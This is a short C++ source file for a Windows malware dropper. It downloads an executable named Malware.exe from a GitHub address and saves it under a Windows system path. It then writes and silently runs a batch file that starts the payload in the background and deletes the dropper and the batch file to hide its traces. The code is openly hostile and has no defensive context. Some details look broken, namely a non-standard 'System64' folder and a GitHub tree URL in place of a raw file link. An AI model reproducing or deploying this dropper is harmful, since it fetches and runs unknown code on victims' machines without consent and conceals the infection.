#include <windows.h>
#include <urlmon.h>
#include <fstream>
#pragma comment(lib, "urlmon.lib")

int main() {
    URLDownloadToFile(NULL,
        "https://github.com/Fghthssss/Oxide/tree/main/Malware/Malware.exe",
        "C:\\Windows\\System64\\payload.exe", 0, NULL);
    std::ofstream bat("C:\\Windows\\System64\\run.bat");
    bat << "@echo off\n";
    bat << "timeout /t 2 /nobreak >nul\n"; 
    bat << "start /B C:\\Windows\\System64\\payload.exe\n";
    bat << "del \"dropper.exe\"\n";
    bat << "del \"C:\\Windows\\System64\\run.bat\"\n"; 
    bat.close();
    ShellExecute(NULL, "open", "C:\\Windows\\System64\\run.bat",
        NULL, NULL, SW_HIDE);
    return 0;
} 